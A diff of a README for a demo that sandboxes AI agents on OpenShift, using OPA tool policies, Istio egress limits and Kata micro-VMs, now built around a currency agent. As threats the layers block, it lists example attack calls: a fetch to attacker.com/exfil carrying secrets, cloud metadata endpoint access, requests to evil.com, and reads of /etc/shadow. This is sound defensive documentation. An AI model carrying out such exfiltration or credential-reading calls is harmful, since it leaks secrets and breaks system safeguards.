@@ -1,509 +1,238 @@
-# Enterprise AI Agent Security on OpenShift
+# Agent Sandbox on OpenShift
 
-## The Problem
-
-AI agents with tool access pose security risks:
-- **Data exfiltration**: Agent calls `fetch_url("https://attacker.com/exfil?data=secrets")`
-- **IMDS attacks**: Agent accesses `http://169.254.169.254/metadata`
-- **Bypass via direct HTTP**: Compromised agent code runs `requests.get("https://evil.com")`
-
-**How do you let agents use tools while preventing misuse?**
-
-## The Solution: Three-Layer Security
+A demo showing three-layer security for AI agents using the **Currency Agent** example:
 
 | Layer | Technology | What It Blocks |
 |-------|------------|----------------|
-| **1. Tool Policy** | MCP Gateway + Authorino/OPA | Unauthorized tool arguments |
+| **1. Tool Policy** | MCP Gateway + Authorino/OPA | Unauthorized tool arguments (e.g., crypto) |
 | **2. Network Egress** | Istio REGISTRY_ONLY | Direct internet access from pods |
 | **3. Execution Isolation** | OpenShift Sandboxed Containers (Kata) | Host access if agent is compromised |
 
-This is inspired by [Anthropic's SRT](https://github.com/anthropic-experimental/sandbox-runtime), adapted for Kubernetes/OpenShift using production-grade components.
+Inspired by [Anthropic's SRT](https://github.com/anthropic-experimental/sandbox-runtime), adapted for Kubernetes/OpenShift.
 
 ---
 
 ## Architecture
 
-```mermaid
-flowchart TB
-    subgraph Kagenti["Kagenti Platform"]
-        AgentCRD["Agent CRD<br/>(runtimeClassName: kata)"]
-        Operator["Kagenti Operator"]
-        MCPGateway["MCP Gateway"]
-    end
-
-    subgraph KataVM["Kata VM (Isolated Execution)"]
-        AgentPod["Agent Pod<br/>(Google ADK with fetch_url)"]
-        Sidecar["Istio Sidecar"]
-    end
-
-    subgraph Policy["Policy Layer"]
-        Authorino["Authorino"]
-        OPA["OPA Policy"]
-    end
-
-    subgraph External["External Services"]
-        Approved["✅ httpbin.org<br/>✅ api.weather.gov"]
-        Blocked["❌ malicious.com"]
-    end
-
-    %% Deployment: Kagenti creates agent in Kata VM
-    AgentCRD -->|"1. reconcile"| Operator
-    Operator -->|"2. create pod<br/>(runtimeClassName: kata)"| AgentPod
-
-    %% Tool call flow
-    AgentPod -->|"3. tools/call(fetch_url)"| MCPGateway
-    MCPGateway -->|"4. authorize"| Authorino
-    Authorino --> OPA
-    OPA -->|"5. allow/deny"| Authorino
-    Authorino --> MCPGateway
-
-    %% If allowed, agent executes fetch
-    MCPGateway -->|"6. allowed"| AgentPod
-    AgentPod -->|"7. fetch"| Approved
-
-    %% Blocked paths
-    MCPGateway -.->|"denied by OPA"| Blocked
-    Sidecar -.->|"blocked by Istio"| Blocked
-
-    style KataVM fill:#e3f2fd,stroke:#1976d2,stroke-width:2px
-    style Kagenti fill:#fff3e0,stroke:#ff9800
-    style Policy fill:#fce4ec,stroke:#e91e63
-    style Blocked fill:#ffebee,stroke:#f44336
-    style Approved fill:#e8f5e9,stroke:#4caf50
+```
+┌─────────────────────────────────────────────────────────────┐
+│              LAYER 3: Kata VM Isolation                     │
+│  ┌───────────────────────────────────────────────────────┐  │
+│  │             Currency Agent (Kata Pod)                 │  │
+│  │  "Convert USD to EUR" ──► MCP Gateway                 │  │
+│  └───────────────────────────────────────────────────────┘  │
+└─────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────┐
+│              LAYER 1: MCP Gateway + OPA                     │
+│  ┌───────────────────────────────────────────────────────┐  │
+│  │     Host: currency-mcp.mcp.local                      │  │
+│  │              │                                        │  │
+│  │       ┌──────▼──────┐                                 │  │
+│  │       │  Authorino  │   ✅ USD → EUR (allowed)        │  │
+│  │       │   (OPA)     │   ❌ USD → BTC (blocked)        │  │
+│  │       └──────┬──────┘                                 │  │
+│  │              │                                        │  │
+│  │       Currency MCP Server                             │  │
+│  └───────────────────────────────────────────────────────┘  │
+└─────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────┐
+│              LAYER 2: Istio Egress Control                  │
+│  ┌───────────────────────────────────────────────────────┐  │
+│  │  ServiceEntry (Allowed):                              │  │
+│  │    ✅ api.frankfurter.app                              │  │
+│  │    ✅ generativelanguage.googleapis.com                │  │
+│  │    ❌ All other external hosts                         │  │
+│  └───────────────────────────────────────────────────────┘  │
+└─────────────────────────────────────────────────────────────┘
 ```
 
-### Key Points
-
-1. **Kagenti Agent CRD** - Deploys the agent with `runtimeClassName: kata`
-2. **Kata VM** - Agent runs inside a micro-VM (not just a container)
-3. **MCP Gateway** - Routes tool calls through policy enforcement
-4. **OPA Policy** - Inspects tool arguments and blocks unauthorized URLs
-
-### Request Flow
-
-```mermaid
-sequenceDiagram
-    participant User
-    participant CRD as Agent CR (Kagenti)
-    participant Operator as Kagenti Operator
-    participant Kata as Kata Runtime
-    participant Agent as Agent (in Kata VM)
-    participant Gateway as MCP Gateway
-    participant OPA as Authorino/OPA
-
-    Note over User,OPA: 1. Deploy Agent via Kagenti CRD
-    User->>CRD: oc apply -f agent.yaml<br/>(runtimeClassName: kata)
-    CRD->>Operator: Reconcile
-    Operator->>Kata: Create pod with Kata runtime
-    Kata->>Agent: Agent running in micro-VM
-
-    Note over User,OPA: 2. Tool Call - BLOCKED
-    Agent->>Gateway: fetch_url("malicious.com")
-    Gateway->>OPA: Check policy
-    OPA-->>Gateway: DENY (url not approved)
-    Gateway-->>Agent: HTTP 403
-
-    Note over User,OPA: 3. Tool Call - ALLOWED
-    Agent->>Gateway: fetch_url("httpbin.org")
-    Gateway->>OPA: Check policy
-    OPA-->>Gateway: ALLOW
-    Gateway-->>Agent: HTTP 200 (proceed)
-    Agent->>Agent: Execute fetch to httpbin.org
-```
-
----
----
-
-## Security Layers Explained
-
-### Layer 1: Tool Policy (MCP Gateway + Authorino/OPA)
-
-**What it is:** OPA policies that inspect tool call arguments before execution.
-
-**Capabilities:**
-| Capability | Status | How |
-|------------|--------|-----|
-| Block tools by name | ✅ | `input.context.request.http.body.params.name == "dangerous_tool"` |
-| Block URLs by pattern | ✅ | `not startswith(url, "https://approved-domain.com")` |
-| Block parameters by value | ✅ | `input.context.request.http.body.params.arguments.city == "Moscow"` |
-| Per-agent policies | ✅ | Multiple `AuthPolicy` resources per namespace |
-| Audit logging | ✅ | Authorino logs all decisions |
-
-**Example policy:**
-```rego
-deny[msg] {
-  input.context.request.http.body.method == "tools/call"
-  input.context.request.http.body.params.name == "fetch_url"
-  url := input.context.request.http.body.params.arguments.url
-  not approved_url(url)
-  msg := "URL not in approved list"
-}
-
-approved_url(url) if startswith(url, "https://api.weather.gov")
-approved_url(url) if startswith(url, "https://httpbin.org")
-```
-
-**What it blocks:** An agent calling `fetch_url("https://malicious.com")` → **403 Forbidden**
-
----
-
-### Layer 2: Network Egress (Istio REGISTRY_ONLY + ServiceEntry)
-
-**What it is:** Istio sidecar proxies that block all outbound traffic except explicitly registered services.
-
-**Capabilities:**
-| Capability | Status | How |
-|------------|--------|-----|
-| Block direct internet access | ✅ | `outboundTrafficPolicy: REGISTRY_ONLY` |
-| Allow specific external hosts | ✅ | `ServiceEntry` with `MESH_EXTERNAL` |
-| Per-namespace overrides | ✅ | Namespace-scoped `Sidecar` resource |
-| Protocol enforcement | ✅ | Only allow HTTPS on port 443 |
-| mTLS between pods | ✅ | Istio mesh default |
-
-**Configuration:**
-```yaml
-# Block all outbound by default
-meshConfig:
-  outboundTrafficPolicy:
-    mode: REGISTRY_ONLY
-
-# Explicitly allow specific APIs
-apiVersion: networking.istio.io/v1beta1
-kind: ServiceEntry
-metadata:
-  name: approved-external-apis
-spec:
-  hosts:
-    - api.weather.gov
-    - httpbin.org
-  location: MESH_EXTERNAL
-  resolution: DNS
-```
-
-**What it blocks:** Agent code running `requests.get("https://evil.com")` → **Connection refused**
-
----
-
-### Layer 3: Execution Isolation (OpenShift Sandboxed Containers / Kata)
-
-**What it is:** Each agent pod runs inside a dedicated micro-VM with its own kernel.
-
-**Capabilities:**
-| Capability | Status | How |
-|------------|--------|-----|
-| VM-level isolation | ✅ | QEMU/KVM hypervisor boundary |
-| Separate kernel | ✅ | Guest kernel inside VM, not host |
-| Host filesystem not visible | ✅ | VM has isolated root filesystem |
-| Host network not accessible | ✅ | VM has separate network namespace |
-| Unix sockets isolated | ✅ | VM cannot see host IPC sockets |
-| Kernel exploits contained | ✅ | Guest kernel crash doesn't affect host |
-
-**Configuration:**
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: agent-pod
-spec:
-  runtimeClassName: kata  # Run in VM, not container
-  containers:
-    - name: agent
-      resources:
-        limits:
-          memory: "2Gi"  # Required for QEMU overhead
-```
-
-**What it blocks:** Compromised agent code trying to:
-- Access `/etc/shadow` on host → **Sees only VM filesystem**
-- Escape to host via kernel exploit → **Trapped inside guest VM**
-- Access Docker socket → **Not visible in VM**
-
----
-
-### How the Layers Work Together
-
-| Attack | Layer 1 (OPA) | Layer 2 (Istio) | Layer 3 (Kata) |
-|--------|---------------|-----------------|----------------|
-| `fetch_url("https://evil.com")` | ✅ BLOCKED | - | - |
-| `requests.get("https://evil.com")` | Bypassed | ✅ BLOCKED | - |
-| Kernel exploit → host escape | Bypassed | Bypassed | ✅ CONTAINED |
-| Access Docker socket | Bypassed | Bypassed | ✅ NOT VISIBLE |
-| Read `/etc/shadow` on host | Bypassed | Bypassed | ✅ ISOLATED |
-
-**Defense in depth:** If one layer is bypassed, the next layer catches the attack.
-
----
-
-## Verified Demo Results
-
-Tested on: 2024-12-30 (OpenShift 4.14 cluster)
-
-### Layer 1: MCP Gateway + OPA Policy
-
-| Test | Tool Name | URL | Expected | Actual |
-|------|-----------|-----|----------|--------|
-| Blocked URL | `fetch_url` | `https://malicious.com` | 403 | **HTTP 403 ✅** |
-| Allowed URL | `fetch_url` | `https://httpbin.org/get` | 200 | **HTTP 200 ✅** |
-| IMDS blocked | `fetch_url` | `http://169.254.169.254` | 403 | **HTTP 403 ✅** |
-
-**Note:** OPA policy uses exact tool name matching. Ensure the policy `deny` rule matches the registered tool name.
-
-### Layer 3: Execution Isolation (Kata)
-
-| Check | Expected | Actual |
-|-------|----------|--------|
-| Agent pod `runtimeClassName` | `kata` | **`kata` ✅** |
-| Pod on Kata-enabled node | Has `node-role.kubernetes.io/kata-oc` label | **✅ Yes** |
-| Agent deployed via Kagenti CRD | Uses `Agent` CR | **✅ Yes** |
-
-**Command verification:**
-```bash
-$ oc get pod -n agent-sandbox -o jsonpath='{.items[0].spec.runtimeClassName}'
-kata
-
-$ oc get agent -n agent-sandbox
-NAME             READY
-adk-kata-agent   True
-```
-
----
 ---
 
 ## Prerequisites
 
 - OpenShift 4.14+ cluster with admin access
 - `oc` CLI configured and logged in
-- `helm` CLI installed (v3.10+)
 - OpenShift Sandboxed Containers operator installed
 - Kuadrant operator installed
+- **Kagenti installed** ([OpenShift Installation Guide](https://github.com/kagenti/kagenti/blob/main/docs/ocp/openshift-install.md))
 
 ---
 
-## Installation
+## Files
 
-### Step 1: Install Kagenti
+| File | What | Why |
+|------|------|-----|
+| `00-kataconfig.yaml` | Kata runtime config | Enables VM isolation on nodes |
+| `01-namespaces.yaml` | Create namespaces | `mcp-test`, `agent-sandbox` |
+| `02-currency-mcp-server.yaml` | Currency MCP Server | Provides `get_exchange_rate` tool |
+| `03-currency-httproute.yaml` | HTTPRoute | Routes to MCP server via gateway |
+| `04-authpolicy.yaml` | OPA policy | Blocks BTC/ETH, allows fiat currencies |
+| `05-currency-agent.yaml` | Kagenti Agent | Runs in Kata VM |
+| `06-service-entry.yaml` | Istio egress rules | Allows `api.frankfurter.app` |
 
-Follow the [Kagenti OpenShift Installation Guide](https://github.com/kagenti/kagenti/blob/main/docs/ocp/openshift-install.md).
+---
 
-**Important:** If you have existing operators, disable conflicting components:
+## Quick Start
 
 ```bash
-helm install kagenti-deps charts/kagenti-deps \
-  -n kagenti-system --create-namespace \
-  --set openshift=true \
-  --set components.keycloak.enabled=false \
-  --set components.istio.enabled=false \
-  --set components.tekton.enabled=false \
-  --set components.certManager.enabled=false
+# 0. Enable Kata runtime (PREREQUISITE - wait 10-15 min)
+oc label node <NODE_NAME> node-role.kubernetes.io/kata-oc=""
+oc apply -f 00-kataconfig.yaml
+watch oc get runtimeclass kata  # Wait for this to appear
+
+# 1. Create namespaces
+oc apply -f 01-namespaces.yaml
+
+# 2. Create secrets
+oc create secret generic gemini-api-key \
+  --from-literal=GOOGLE_API_KEY='your-key' -n agent-sandbox
+
+oc create secret docker-registry quay-pull-secret \
+  --docker-server=quay.io \
+  --docker-username=<user> \
+  --docker-password=<token> \
+  -n mcp-test
+
+oc create secret docker-registry quay-pull-secret \
+  --docker-server=quay.io \
+  --docker-username=<user> \
+  --docker-password=<token> \
+  -n agent-sandbox
+
+# 3. Deploy MCP Server
+oc apply -f 02-currency-mcp-server.yaml
+
+# 4. Create HTTPRoute
+oc apply -f 03-currency-httproute.yaml
+
+# 5. Apply OPA AuthPolicy
+oc apply -f 04-authpolicy.yaml
+
+# 6. Configure Istio egress
+oc apply -f 06-service-entry.yaml
+
+# 7. Deploy Agent in Kata VM
+oc apply -f 05-currency-agent.yaml
+
+# 8. Run tests
+./scripts/demo-complete.sh
 ```
 
-### Step 2: Fix System Namespace Labels
+---
 
-**Critical:** System namespaces with controllers must NOT have ambient mode:
-
-```bash
-# Remove ambient label from kagenti-system (controller needs API access)
-oc label namespace kagenti-system istio.io/dataplane-mode-
-
-# Restart controller
-oc delete pod -n kagenti-system -l control-plane=controller-manager
-```
-
-### Step 3: Configure Istio for OPA Body Forwarding
+## Test OPA Policy
 
 ```bash
-oc patch istio default -n istio-system --type=merge -p '
-{
-  "spec": {
-    "values": {
-      "meshConfig": {
-        "extensionProviders": [
-          {
-            "name": "kuadrant-authorization",
-            "envoyExtAuthzGrpc": {
-              "service": "authorino-authorino-authorization.kuadrant-system.svc.cluster.local",
-              "port": 50051,
-              "timeout": "5s",
-              "includeRequestBodyInCheck": {
-                "maxRequestBytes": 8192,
-                "allowPartialMessage": true
-              }
-            }
-          }
-        ]
-      }
-    }
-  }
-}'
-```
-
-### Step 4: Apply OPA Policy
-
-```bash
-oc apply -f manifests/policies/url-blocking-policy.yaml
-
-# Verify
-oc get authpolicy -n gateway-system
-```
-
-### Step 5: Configure Istio Egress Control
-
-```bash
-# Add ServiceEntry for approved external APIs
-oc apply -f - <<EOF
-apiVersion: networking.istio.io/v1beta1
-kind: ServiceEntry
+# Create test pod (without Istio sidecar)
+cat <<EOF | oc apply -f -
+apiVersion: v1
+kind: Pod
 metadata:
-  name: approved-external-apis
-  namespace: istio-system
+  name: test-curl
+  namespace: mcp-test
+  annotations:
+    sidecar.istio.io/inject: "false"
 spec:
-  hosts:
-    - httpbin.org
-    - api.weather.gov
-    - api.github.com
-    - example.com
-  ports:
-    - number: 443
-      name: https
-      protocol: HTTPS
-  location: MESH_EXTERNAL
-  resolution: DNS
+  containers:
+  - name: curl
+    image: curlimages/curl
+    command: ["sleep", "3600"]
 EOF
 
-# Apply REGISTRY_ONLY mode
-oc patch istio default -n istio-system --type=merge -p '
-{
-  "spec": {
-    "values": {
-      "meshConfig": {
-        "outboundTrafficPolicy": {
-          "mode": "REGISTRY_ONLY"
-        }
-      }
-    }
-  }
-}'
-```
+oc wait --for=condition=Ready pod/test-curl -n mcp-test --timeout=60s
 
-### Step 6: Configure OpenShift Sandboxed Containers
+# Initialize session
+SESSION=$(oc exec -n mcp-test test-curl -- curl -s \
+  http://mcp-gateway-istio.gateway-system.svc.cluster.local:8080/mcp \
+  -H "Host: currency-mcp.mcp.local" \
+  -H "Content-Type: application/json" \
+  -H "Accept: application/json, text/event-stream" \
+  -d '{"jsonrpc":"2.0","id":"1","method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"test","version":"1.0"}}}' \
+  -D - 2>/dev/null | grep -i "mcp-session-id:" | awk -F': ' '{print $2}' | tr -d '\r')
 
-```bash
-# Label worker nodes for Kata
-oc label node <NODE_NAME> node-role.kubernetes.io/kata-oc=""
+# ALLOWED: USD → EUR (HTTP 200)
+oc exec -n mcp-test test-curl -- curl -sw '%{http_code}' -o /dev/null \
+  http://mcp-gateway-istio.gateway-system.svc.cluster.local:8080/mcp \
+  -H "Host: currency-mcp.mcp.local" \
+  -H "Content-Type: application/json" \
+  -H "Accept: application/json, text/event-stream" \
+  -H "Mcp-Session-Id: $SESSION" \
+  -d '{"jsonrpc":"2.0","id":"2","method":"tools/call","params":{"name":"get_exchange_rate","arguments":{"currency_from":"USD","currency_to":"EUR"}}}'
 
-# Apply KataConfig
-oc apply -f manifests/osc/kataconfig.yaml
-
-# Wait for RuntimeClass (10-15 min)
-watch oc get runtimeclass kata
-```
-
-### Step 7: Deploy Agent with Kata Runtime
-
-```bash
-oc apply -f manifests/osc/sandboxed-agent.yaml
-
-# Verify
-oc get pod -n agent-sandbox -o jsonpath='{.items[0].spec.runtimeClassName}'
-# Should output: kata
-```
-
-**Important:** Kata pods require **2Gi memory minimum** due to QEMU overhead.
-
----
-
-## Run the Demo
-
-```bash
-# From inside the cluster
-oc run demo --rm -it --restart=Never --image=curlimages/curl:latest -- sh -c '
-  # Initialize MCP session
-  curl -s -D /tmp/h -X POST "http://mcp-gateway-istio.gateway-system.svc.cluster.local:8080/mcp" \
-    -H "Content-Type: application/json" \
-    -H "Host: mcp.127-0-0-1.sslip.io" \
-    -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2024-11-05\",\"capabilities\":{},\"clientInfo\":{\"name\":\"demo\",\"version\":\"1.0\"}}}" > /dev/null
-  SESSION=$(grep -i "mcp-session-id:" /tmp/h | cut -d: -f2- | tr -d " \r\n")
-  
-  echo "=== LAYER 1: OPA Policy ==="
-  echo -n "fetch_url(malicious.com): "
-  curl -s -w "HTTP %{http_code}\n" -o /dev/null -X POST "http://mcp-gateway-istio.gateway-system.svc.cluster.local:8080/mcp" \
-    -H "Content-Type: application/json" -H "Host: mcp.127-0-0-1.sslip.io" -H "mcp-session-id: $SESSION" \
-    -d "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"fetch_url\",\"arguments\":{\"url\":\"https://malicious.com\"}}}"
-  
-  echo -n "fetch_url(httpbin.org): "
-  curl -s -w "HTTP %{http_code}\n" -o /dev/null -X POST "http://mcp-gateway-istio.gateway-system.svc.cluster.local:8080/mcp" \
-    -H "Content-Type: application/json" -H "Host: mcp.127-0-0-1.sslip.io" -H "mcp-session-id: $SESSION" \
-    -d "{\"jsonrpc\":\"2.0\",\"id\":3,\"method\":\"tools/call\",\"params\":{\"name\":\"fetch_url\",\"arguments\":{\"url\":\"https://httpbin.org/get\"}}}"
-  
-  echo ""
-  echo "=== LAYER 2: Istio Egress ==="
-  echo -n "Direct curl evil-site.net: "
-  curl -s -o /dev/null -w "HTTP %{http_code}\n" https://evil-site.net --connect-timeout 5 || echo "BLOCKED (connection refused)"
-  
-  echo -n "Direct curl httpbin.org: "
-  curl -s -o /dev/null -w "HTTP %{http_code}\n" https://httpbin.org/get --connect-timeout 10
-'
-```
-
-**Expected Output:**
-```
-=== LAYER 1: OPA Policy ===
-fetch_url(malicious.com): HTTP 403
-fetch_url(httpbin.org): HTTP 200
-
-=== LAYER 2: Istio Egress ===
-Direct curl evil-site.net: BLOCKED (connection refused)
-Direct curl httpbin.org: HTTP 200
+# BLOCKED: USD → BTC (HTTP 403)
+oc exec -n mcp-test test-curl -- curl -sw '%{http_code}' -o /dev/null \
+  http://mcp-gateway-istio.gateway-system.svc.cluster.local:8080/mcp \
+  -H "Host: currency-mcp.mcp.local" \
+  -H "Content-Type: application/json" \
+  -H "Accept: application/json, text/event-stream" \
+  -H "Mcp-Session-Id: $SESSION" \
+  -d '{"jsonrpc":"2.0","id":"3","method":"tools/call","params":{"name":"get_exchange_rate","arguments":{"currency_from":"USD","currency_to":"BTC"}}}'
 ```
 
 ---
 
-## Comparison with Other Approaches
+## Expected Results
 
-### vs Anthropic SRT
+| Test | Currency | Expected |
+|------|----------|----------|
+| ✅ Allowed | USD → EUR | HTTP 200 OK |
+| ✅ Allowed | GBP → JPY | HTTP 200 OK |
+| ❌ Blocked | USD → BTC | HTTP 403 Forbidden |
+| ❌ Blocked | ETH → EUR | HTTP 403 Forbidden |
 
-| Capability | Anthropic SRT | This Demo |
-|------------|---------------|-----------|
-| Network filtering | Proxy-based | Istio + OPA |
-| Filesystem isolation | OS sandboxing (bubblewrap) | VM isolation (Kata) |
-| Unix sockets | seccomp blocks socket() | Isolated by default (VM) |
-| Tool argument inspection | ❌ | ✅ OPA policy |
-| Kubernetes native | ❌ | ✅ |
-| Isolation strength | Process-level | **VM-level (stronger)** |
+---
 
-### vs GKE Agent Sandbox
+## Verify Kata VM Isolation
 
-| Capability | GKE Agent Sandbox | This Demo |
-|------------|-------------------|-----------|
-| Isolation technology | gVisor | Kata (full VM) |
-| Tool policy | ❌ | ✅ OPA at gateway |
-| Pod Snapshots | ✅ | ❌ |
-| Platform | GKE only | OpenShift |
+```bash
+# Check agent is using Kata runtime
+oc get pod -n agent-sandbox -l app=currency-agent \
+  -o jsonpath='{.items[0].spec.runtimeClassName}'
+# Expected: kata
 
-### vs Tiramisu Operator
+# Check agent status
+oc get agent -n agent-sandbox
+# Expected: currency-agent  True
+```
 
-| Capability | Tiramisu | This Demo |
-|------------|----------|-----------|
-| Network filtering | Domain allowlist | Istio REGISTRY_ONLY |
-| Tool context | ❌ (just domain) | ✅ (tool + args) |
-| Can block specific paths on allowed domain | ❌ | ✅ |
-| Configuration | TiramisuConfig CRD | AuthPolicy + ServiceEntry |
+---
+
+## Project Structure
+
+```
+.
+├── 00-kataconfig.yaml       # Kata runtime (prerequisite)
+├── 01-namespaces.yaml       # mcp-test, agent-sandbox
+├── 02-currency-mcp-server.yaml  # MCP server deployment
+├── 03-currency-httproute.yaml   # Gateway routing
+├── 04-authpolicy.yaml       # OPA policy (blocks BTC/ETH)
+├── 05-currency-agent.yaml   # Kagenti Agent in Kata VM
+├── 06-service-entry.yaml    # Istio egress allowlist
+├── scripts/
+│   └── demo-complete.sh     # Test all security layers
+├── docs/
+│   ├── architecture.md      # Detailed diagrams
+│   └── troubleshooting.md   # Common issues
+└── README.md
+```
 
 ---
 
 ## Key Technical Details
 
-### 1. System Namespaces Must Not Have Ambient Mode
+### 1. MCP Server Must Have Istio Sidecar Disabled
 
-The `kagenti-system` namespace contains controllers that need direct Kubernetes API access. Remove the ambient label:
-
-```bash
-oc label namespace kagenti-system istio.io/dataplane-mode-
+```yaml
+metadata:
+  annotations:
+    sidecar.istio.io/inject: "false"
 ```
 
 ### 2. Kata Pods Require 2Gi Memory
-
-Kata runs each pod in a QEMU micro-VM. The QEMU overhead requires at least 2Gi:
 
 ```yaml
 resources:
@@ -513,106 +242,28 @@ resources:
     memory: "2Gi"
 ```
 
-### 3. OPA Requires Request Body Forwarding
+### 3. Test Pods Need Sidecar Disabled
 
-For OPA to inspect tool arguments, Istio must forward the request body to Authorino:
+Otherwise you get 502 Bad Gateway errors.
 
-```yaml
-includeRequestBodyInCheck:
-  maxRequestBytes: 8192
-  allowPartialMessage: true
-```
+### 4. Host Header Required for Gateway Routing
 
-### 4. ServiceEntry Required for External APIs
-
-With `REGISTRY_ONLY` mode, external APIs must be explicitly registered:
-
-```yaml
-apiVersion: networking.istio.io/v1beta1
-kind: ServiceEntry
-metadata:
-  name: approved-external-apis
-spec:
-  hosts:
-    - api.weather.gov
-    - httpbin.org
-  location: MESH_EXTERNAL
-  resolution: DNS
+```bash
+curl -H "Host: currency-mcp.mcp.local" http://mcp-gateway-istio.gateway-system.svc.cluster.local:8080/mcp
 ```
 
 ---
 
-## Troubleshooting
+## How the Layers Work Together
 
-### Controller CrashLoopBackOff
+| Attack | Layer 1 (OPA) | Layer 2 (Istio) | Layer 3 (Kata) |
+|--------|---------------|-----------------|----------------|
+| `get_exchange_rate("USD", "BTC")` | ✅ BLOCKED | - | - |
+| `requests.get("https://evil.com")` | Bypassed | ✅ BLOCKED | - |
+| Kernel exploit → host escape | Bypassed | Bypassed | ✅ CONTAINED |
+| Read `/etc/shadow` on host | Bypassed | Bypassed | ✅ ISOLATED |
 
-**Symptom:** `kagenti-controller-manager` can't reach Kubernetes API
-
-**Cause:** Namespace has `istio.io/dataplane-mode: ambient` label
-
-**Fix:**
-```bash
-oc label namespace kagenti-system istio.io/dataplane-mode-
-oc delete pod -n kagenti-system -l control-plane=controller-manager
-```
-
-### OPA Policy Not Blocking
-
-**Symptom:** All requests pass through
-
-**Cause:** Request body not forwarded to Authorino
-
-**Fix:** Add `includeRequestBodyInCheck` to Istio mesh config
-
-### Kata Pods Stuck Pending
-
-**Symptom:** Pods with `runtimeClassName: kata` don't schedule
-
-**Cause:** Node selector mismatch
-
-**Fix:**
-```bash
-oc get runtimeclass kata -o yaml | grep -A5 scheduling
-# Ensure nodes have matching label
-oc get nodes -l node-role.kubernetes.io/kata-oc
-```
-
-### Direct Internet Still Working
-
-**Symptom:** Pods can still reach internet directly
-
-**Cause:** `outboundTrafficPolicy` not set to `REGISTRY_ONLY`
-
-**Fix:**
-```bash
-oc get istio default -n istio-system -o jsonpath='{.spec.values.meshConfig.outboundTrafficPolicy.mode}'
-# Should output: REGISTRY_ONLY
-```
-
----
-
-## Project Structure
-
-```
-.
-├── manifests/
-│   ├── istio/
-│   │   ├── ext-authz-config.yaml      # Istio patch for body forwarding + REGISTRY_ONLY
-│   │   └── service-entry.yaml         # Approved external APIs
-│   ├── osc/
-│   │   ├── kataconfig.yaml            # OpenShift Sandboxed Containers config
-│   │   └── sandboxed-agent.yaml       # Kagenti Agent CR with runtimeClassName: kata
-│   └── policies/
-│       └── url-blocking-policy.yaml   # OPA policy for URL blocking
-├── scripts/
-│   ├── demo-complete.sh               # Full demo script (all 3 layers)
-│   ├── setup-namespaces.sh            # Enable Istio sidecar on namespaces
-│   └── test-policy.sh                 # Quick OPA policy test
-├── docs/
-│   ├── architecture.md                # Detailed architecture diagrams
-│   └── troubleshooting.md             # Common issues and fixes
-└── README.md
-```
+**Defense in depth:** If one layer is bypassed, the next layer catches the attack.
 
 ---
 
@@ -622,7 +273,7 @@ oc get istio default -n istio-system -o jsonpath='{.spec.values.meshConfig.outbo
 - [OpenShift Sandboxed Containers](https://docs.openshift.com/container-platform/latest/sandboxed_containers/index.html)
 - [Kuadrant/Authorino](https://github.com/Kuadrant/authorino) - Policy engine
 - [Anthropic SRT](https://github.com/anthropic-experimental/sandbox-runtime) - Inspiration
-- [Istio Egress Control](https://istio.io/latest/docs/tasks/traffic-management/egress/)
+- [Frankfurter API](https://www.frankfurter.app/) - Currency exchange rates
 
 ## License
 
